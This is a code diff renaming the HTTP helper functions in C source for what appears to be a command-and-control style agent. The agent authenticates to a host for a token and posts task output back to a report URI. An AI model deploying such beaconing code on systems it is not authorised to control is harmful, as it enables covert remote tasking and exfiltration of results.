@@ -22,7 +22,7 @@ void authenticate() {
   addString(&connectMessage, "");
   addString(&connectMessage, "");
 
-  http_getrequest(host, port, "/r", 40, &httpBytesRead, agentToken);
+  httpGet(host, port, "/r", 40, &httpBytesRead, agentToken);
   agentToken[httpBytesRead] = 0x00;
   
   agent.token = agentToken;
@@ -33,13 +33,13 @@ void authenticate() {
   strcpy(agent.report_uri, "/t?token=");
   strcat(agent.report_uri, agentToken);
   
-  http_postrequest(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize);
+  httpPost(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize);
 
   free(connectMessage.buf);
   free(agentToken);
 }
 
-void send_output(int taskId, char* typ, char* error, int size, char * buff) {
+void sendData(int taskId, char* typ, char* error, int size, char * buff) {
   struct TLVBuild outputMessage;
   outputMessage.buf = malloc(50);
   outputMessage.allocsize = 50;
@@ -53,7 +53,7 @@ void send_output(int taskId, char* typ, char* error, int size, char * buff) {
   DWORD bytesRead;
   printf("[+] Sending %lu bytes: %.*s\n", outputMessage.bufsize, outputMessage.bufsize, outputMessage.buf);
 
-  http_postrequest(
+  httpPost(
     host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
   );
 }
